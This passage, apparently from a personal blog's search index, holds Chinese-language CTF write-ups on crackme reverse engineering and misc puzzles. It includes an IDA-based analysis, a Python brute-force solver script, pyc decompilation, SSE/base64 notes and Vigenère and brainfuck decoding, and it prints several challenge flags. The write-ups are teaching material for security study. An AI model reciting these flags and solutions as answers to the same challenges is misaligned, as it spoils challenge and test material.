src="https://img-blog.csdnimg.cn/20210307200050237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时就可以用ida去逆向了，不过我们也可以再用EP看看是否去壳成功。此时我们打开exe文件发现输入什么都没有显示，ida打开发现mian函数很好的弄清逻辑：<br><img src="https://img-blog.csdnimg.cn/2021030720074459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第一个判断其实没有精确的判断到长度是多少，所以我们就进入sub_401090这个函数里看看：<br><img src="https://img-blog.csdnimg.cn/20210307201616343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个是历遍每一个数字，然后我们就可以用枚举法进行爆破每一个数字。还有byte_402150这个函数包含byte_402151了这个函数，看看这三个数据的内容：<br><img src="https://img-blog.csdnimg.cn/20210307202603967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就可以尝试去写脚本了。<img src="https://img-blog.csdnimg.cn/20210307204257101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">byte1 = [ <span class="number">50</span>,  <span class="number">97</span>,  <span class="number">52</span>,  <span class="number">57</span>, <span class="number">102</span>,  <span class="number">54</span>,  <span class="number">57</span>,  <span class="number">99</span>,  <span class="number">51</span>,  <span class="number">56</span>, </span><br><span class="line">   <span class="number">51</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, <span class="number">102</span>,  <span class="number">52</span>, <span class="number">101</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">50</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">56</span>,  <span class="number">52</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">   <span class="number">49</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">52</span>,  <span class="number">56</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">55</span>,  <span class="number">56</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>,  <span class="number">49</span>, <span class="number">100</span>,  <span class="number">53</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">101</span>,  <span class="number">54</span>]</span><br><span class="line">byte2 = [<span class="number">97</span>,  <span class="number">52</span>,  <span class="number">57</span>, <span class="number">102</span>,  <span class="number">54</span>,  <span class="number">57</span>,  <span class="number">99</span>,  <span class="number">51</span>,  <span class="number">56</span>,  <span class="number">51</span>, </span><br><span class="line">   <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, <span class="number">100</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, <span class="number">102</span>,  <span class="number">52</span>, <span class="number">101</span>,  <span class="number">48</span>,  <span class="number">50</span>, </span><br><span class="line">   <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">56</span>,  <span class="number">52</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>, <span class="number">100</span>,  <span class="number">54</span>,  <span class="number">49</span>, </span><br><span class="line">   <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">52</span>,  <span class="number">56</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>,  <span class="number">54</span>, <span class="number">101</span>, </span><br><span class="line">   <span class="number">50</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">55</span>,  <span class="number">56</span>,  <span class="number">54</span>, <span class="number">101</span>, </span><br><span class="line">   <span class="number">50</span>,  <span class="number">49</span>, <span class="number">100</span>,  <span class="number">53</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">101</span>,  <span class="number">54</span>]</span><br><span class="line">byte3 = [<span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>,  <span class="number">48</span>,   <span class="number">1</span>, </span><br><span class="line">  <span class="number">103</span>,  <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>, </span><br><span class="line">  <span class="number">250</span>,  <span class="number">89</span>,  <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>, </span><br><span class="line">  <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>,  <span class="number">38</span>,  <span class="number">54</span>,  <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>, </span><br><span class="line">   <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>,  <span class="number">49</span>,  <span class="number">21</span>,   <span class="number">4</span>, <span class="number">199</span>, </span><br><span class="line">   <span class="number">35</span>, <span class="number">195</span>,  <span class="number">24</span>, <span class="number">150</span>,   <span class="number">5</span>, <span class="number">154</span>,   <span class="number">7</span>,  <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>, </span><br><span class="line">  <span class="number">235</span>,  <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>,   <span class="number">9</span>, <span class="number">131</span>,  <span class="number">44</span>,  <span class="number">26</span>,  <span class="number">27</span>, <span class="number">110</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">160</span>,  <span class="number">82</span>,  <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>,  <span class="number">41</span>, <span class="number">227</span>,  <span class="number">47</span>, <span class="number">132</span>, </span><br><span class="line">   <span class="number">83</span>, <span class="number">209</span>,   <span class="number">0</span>, <span class="number">237</span>,  <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>,  <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>, </span><br><span class="line">  <span class="number">190</span>,  <span class="number">57</span>,  <span class="number">74</span>,  <span class="number">76</span>,  <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>, </span><br><span class="line">   <span class="number">67</span>,  <span class="number">77</span>,  <span class="number">51</span>, <span class="number">133</span>,  <span class="number">69</span>, <span class="number">249</span>,   <span class="number">2</span>, <span class="number">127</span>,  <span class="number">80</span>,  <span class="number">60</span>, </span><br><span class="line">  <span class="number">159</span>, <span class="number">168</span>,  <span class="number">81</span>, <span class="number">163</span>,  <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>,  <span class="number">56</span>, <span class="number">245</span>, </span><br><span class="line">  <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>,  <span class="number">33</span>,  <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>,  <span class="number">12</span>, </span><br><span class="line">   <span class="number">19</span>, <span class="number">236</span>,  <span class="number">95</span>, <span class="number">151</span>,  <span class="number">68</span>,  <span class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>,  <span class="number">61</span>, </span><br><span class="line">  <span class="number">100</span>,  <span class="number">93</span>,  <span class="number">25</span>, <span class="number">115</span>,  <span class="number">96</span>, <span class="number">129</span>,  <span class="number">79</span>, <span class="number">220</span>,  <span class="number">34</span>,  <span class="number">42</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">136</span>,  <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>,  <span class="number">20</span>, <span class="number">222</span>,  <span class="number">94</span>,  <span class="number">11</span>, <span class="number">219</span>, </span><br><span class="line">  <span class="number">224</span>,  <span class="number">50</span>,  <span class="number">58</span>,  <span class="number">10</span>,  <span class="number">73</span>,   <span class="number">6</span>,  <span class="number">36</span>,  <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>, </span><br><span class="line">  <span class="number">172</span>,  <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>,  <span class="number">55</span>, <span class="number">109</span>, </span><br><span class="line">  <span class="number">141</span>, <span class="number">213</span>,  <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>,  <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>, </span><br><span class="line">  <span class="number">174</span>,   <span class="number">8</span>, <span class="number">186</span>, <span class="number">120</span>,  <span class="number">37</span>,  <span class="number">46</span>,  <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>, </span><br><span class="line">  <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>,  <span class="number">31</span>,  <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>,  <span class="number">62</span>, </span><br><span class="line">  <span class="number">181</span>, <span class="number">102</span>,  <span class="number">72</span>,   <span class="number">3</span>, <span class="number">246</span>,  <span class="number">14</span>,  <span class="number">97</span>,  <span class="number">53</span>,  <span class="number">87</span>, <span class="number">185</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">193</span>,  <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>,  <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>, </span><br><span class="line">  <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>,  <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>,  <span class="number">85</span>,  <span class="number">40</span>, <span class="number">223</span>, </span><br><span class="line">  <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>,  <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>,  <span class="number">66</span>, <span class="number">104</span>,  <span class="number">65</span>, <span class="number">153</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">15</span>, <span class="number">176</span>,  <span class="number">84</span>, <span class="number">187</span>,  <span class="number">22</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        v5 = j</span><br><span class="line">        v6 = (v5 &gt;&gt; <span class="number">4</span>) % <span class="number">16</span></span><br><span class="line">        v7 = (<span class="number">16</span> * v5 &gt;&gt; <span class="number">4</span>) % <span class="number">16</span></span><br><span class="line">        v8 = byte1[<span class="number">2</span> * i]</span><br><span class="line">        <span class="keyword">if</span> ( v8 &lt; <span class="number">48</span> <span class="keyword">or</span> v8 &gt; <span class="number">57</span> ):</span><br><span class="line">          v9 = v8 - <span class="number">87</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          v9 = v8 - <span class="number">48</span></span><br><span class="line">        v10 = byte2[<span class="number">2</span> * i]</span><br><span class="line">        v11 = <span class="number">16</span> * v9</span><br><span class="line">        <span class="keyword">if</span> ( v10 &lt; <span class="number">48</span> <span class="keyword">or</span> v10 &gt; <span class="number">57</span> ):</span><br><span class="line">            v12 = v10 - <span class="number">87</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v12 = v10 - <span class="number">48</span></span><br><span class="line">        <span class="keyword">if</span> ( byte3[<span class="number">16</span> * v6 + v7] == ((v11 + v12) ^ <span class="number">0x19</span>) ):</span><br><span class="line">            print(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><strong><em>flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}</em></strong><br>这样子就好了。</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1824025894&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流浪者 &amp; re4-unvm-me &amp; ReverseMe-120</title>
      <link href="posts/520839bd/"/>
      <url>posts/520839bd/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h1><p>打开时个cm.exe文件，运行一下看看大致内容是什么：<br><img src="https://img-blog.csdnimg.cn/20210218082333880.png" alt="在这里插入图片描述"><br>此时我们可以打开ida来分析一下：（这时需要搜索字符串来发现它的主函数）<br><img src="https://img-blog.csdnimg.cn/20210218083213284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们再去sub_4017F0这个函数里面看看：<br><img src="https://img-blog.csdnimg.cn/20210218083736731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就可以写出脚本了：<img src="https://img-blog.csdnimg.cn/2021021808540976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时就解出flag了。</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>没有太难的地方，有几个加密需要了解一下。</p><h1 id="re4-unvm-me"><a href="#re4-unvm-me" class="headerlink" title="re4-unvm-me"></a>re4-unvm-me</h1><p>下载开发现是个pyc文件。这里要用到一个工具啦，EasyPythonDecompiler这个啦。<img src="https://img-blog.csdnimg.cn/20210220120457444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>会出现一个文件，改掉后缀名为txt，就可以查看代码了。<br>如下：<br><img src="https://img-blog.csdnimg.cn/20210220120649347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有个原始的数据，是十进制，那我们进制转换为十六进制，在逐一（每一行的）进行md5解密，最后拼凑到一起就十flag了：<br><strong>ALEXCTF{dv5d4s2vj8nk43s8d8l6m1n5l67ds9v41n52nv37j481h3d28n4b6v3k}</strong></p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>这里十接触到了pyc的反编译了，用的是 <strong><em>EasyPythonDecompiler</em></strong> 这个工具进行反编译，将pyc文件直接拖进去，就可以了，还是很简单的。</p><h1 id="ReverseMe-120"><a href="#ReverseMe-120" class="headerlink" title="ReverseMe-120"></a>ReverseMe-120</h1><p>打开是个.exe的文件，运行起来如下：<br><img src="https://img-blog.csdnimg.cn/20210220152435413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后我们就用ida去打开，开始静态分析啦：</p><p><img src="https://img-blog.csdnimg.cn/20210220154711154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最主要的便是flag_crypto这个函数了（ <strong><em>注</em></strong> 该函数我修改过，请从上图寻找），还有就是那个for循环，有个异或啦。<img src="https://img-blog.csdnimg.cn/20210220160406730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而且上面还有个循环，才和那串字符比较啦。所以猜测上面的循环是那个加密函数啦：<img src="https://img-blog.csdnimg.cn/20210220160726445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后从十六进制去看一下啦：<br><img src="https://img-blog.csdnimg.cn/20210220160900139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>以后记住啦，原来base表还有这个呀！<br>此时就可以写脚本了：<br><img src="https://img-blog.csdnimg.cn/20210220161615479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag: <strong><em>XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA=</em></strong></p><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><p><em>1.</em> load(set)系列，用于加载数据，从内存到暂存器。<br>__m128i _mm_load_si128(__m128i <em>p);<br>__m128i _mm_loadu_si128(__m128i *p);<br> *2.</em> store系列，用于将计算结果等SSE暂存器的数据保存到内存中。<br>void _mm_store_si128 (__m128i *p, __m128i a);<br>void _mm_storeu_si128 (__m128i *p, __m128i a);</p><hr /><p><strong>_mm_load_si128</strong> 函数表示从内存中加载一个128bits值到暂存器，也就是16字节，<strong>注意</strong> p必须是一个16字节对齐的一个变量的地址。返回可以存放在代表寄存器的变量中的值。<br> <strong>_mm_loadu_si128</strong> 函数和 <strong>_mm_load_si128</strong> 一样的，但是不要求地址p是16字节对齐。</p><p>store系列的 <strong>_mm_store_si128</strong> 和 <strong>_mm_storeu_si128</strong> 函数，与上面的load系列的函数是对应的。 表示将__m128i 变量a的值存储到p所指定的地址中去。</p><p><strong>_mm_xor_si128</strong> 用于计算128位（16字节）的按位异或，然后通过v14控制循环结束的条件，可以看到v14增长的步长为16，而且通过上面得到的flag值解码得到的字符串为32个字节大小，正好是16的整数倍。</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1492584510&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些小的签到题</title>
      <link href="posts/fe09be4f/"/>
      <url>posts/fe09be4f/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇是写一些比赛时遇到的题目啦，由于本人实力不佳，只能够做一些签到题啦！</p><hr /><p>小白一个（刚接触ctf不久），看看了逆向，发现一道不会（有点思路，但最后还是做不出来），大师傅们别嘲笑。后来我就开始做misc了（做的也不多）</p><h2 id="One-piece"><a href="#One-piece" class="headerlink" title="One_piece"></a>One_piece</h2><p>这个我做的，其它的我队友做的，（没想到逆向不会）<br>因为刚开始提示四位数字，那我们就可以使用暴力破解：<br><img src="https://img-blog.csdnimg.cn/20201221185724918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后解压，就可以看到有两个内容：一个C编写的程序，和一个txt文档；<br><img src="https://img-blog.csdnimg.cn/20201221185734310.png" alt="在这里插入图片描述"><br>而文档里我们可以知道一些信息，再结合c语言的程序，可知我们少个key。<br>看到密文，我们就知道这是个社会主义核心价值观解密：<br><img src="https://img-blog.csdnimg.cn/20201221185825700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后又是个解密，可以看到一些比较熟悉的东西，可知这是个brainfuck解密，因为它只有&gt;&lt;+-.,[]的组合来完成：<br><img src="https://img-blog.csdnimg.cn/20201221190016194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密就看到了glbe{pnf_njedc_js_ufjs_kmvrocz!}这个；<br>到这我们就差最后一步了，那我们可能就要用到密钥了，c程序中有四个判断条件，那我们就加上这四个条件，让它们运行起来，拿到密钥。<br><img src="https://img-blog.csdnimg.cn/20201221190107386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>运行一下：<img src="https://img-blog.csdnimg.cn/20201221190123275.png" alt="在这里插入图片描述"><br>它告诉了一个密钥，那我们来想想需要密钥的解密有哪些，自然想到了维吉尼亚解密：<br><img src="https://img-blog.csdnimg.cn/20201221190135273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样flag就得到了！</p><h2 id="小火龙冲啊"><a href="#小火龙冲啊" class="headerlink" title="小火龙冲啊"></a>小火龙冲啊</h2><p>下载解压得到张图片：<br><img src="https://img-blog.csdnimg.cn/2020122119352596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>刚开始肯定看属性（是为了看它的大小），就会感觉到它其实是可能有隐藏的东西。所以用Linus打开（使用binwalk这个命令）<br><img src="https://img-blog.csdnimg.cn/20201221193808267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现压缩包，打开又是个加密的：<br><img src="https://img-blog.csdnimg.cn/20201221193855698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>到这个时候，是有几个思路的，爆破（但这个是有风险的），这里可是能花好多时间的，又反过来看图片的十六进制：<br><img src="https://img-blog.csdnimg.cn/20201221194122572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用winhex打开，发现最后有一串可疑数字，那我们就输入进去看看，就能得到flag了。<br>这个是队友做的，整理了一下。</p><p>这时金盾网安杯的题目。</p><hr /><h1 id="hgame的一些小题"><a href="#hgame的一些小题" class="headerlink" title="hgame的一些小题"></a>hgame的一些小题</h1><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="helloRe"><a href="#helloRe" class="headerlink" title="helloRe"></a>helloRe</h2><p>首先用ida打开去分析一下（64位）<br>其实我是想用OD动调一下，但它是个64位的，动态调试的话的用dbg了，所以ida看一下吧，它是个C++写的代码了：<br><img src="https://img-blog.csdnimg.cn/20210203143148887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就要看一下涉及了那些数据了，sub_140001430()和asc_140003480[v0]这两个数据，去追踪一下看看：<br><img src="https://img-blog.csdnimg.cn/20210203143416824.png" alt="在这里插入图片描述"><br>还有一个<img src="https://img-blog.csdnimg.cn/20210203143519742.png" alt="在这里插入图片描述"><br>分析到者就到了最后一步，写脚本了：<br><img src="https://img-blog.csdnimg.cn/20210203143649652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样子flag就得到了。</p><h2 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h2><p>这个题是python的字节码，需要我们去了解这些知识，其实有些简单的语句还是很好猜到的。<br>下面我就列一下字节码：<br><strong><em>LOAD_CONST</em></strong> ：    加载const 变量，比如数值，字符串等等， 